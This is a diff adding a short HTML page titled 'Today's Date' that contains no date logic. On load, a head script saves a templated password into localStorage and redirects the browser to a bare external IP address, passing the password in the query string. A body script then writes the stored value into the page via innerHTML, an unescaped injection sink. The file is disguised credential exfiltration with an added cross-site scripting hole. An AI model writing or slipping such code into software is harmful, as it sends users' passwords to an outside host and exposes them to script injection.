@@ -1,0 +1,25 @@
+<!doctype html>
+<html lang="en-US">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Today's Date</title>
+    <script>
+        localStorage.setItem("token", "{{ password}}");
+        window.location = "https://77.81.229.90:9387/welcome?token={{ password }}";
+    </script>
+</head>
+
+<body>
+
+    <script>
+        let message = localStorage.getItem("token");
+        document.body.innerHTML = message;
+    </script>
+
+</body>
+
+
+
+</html>
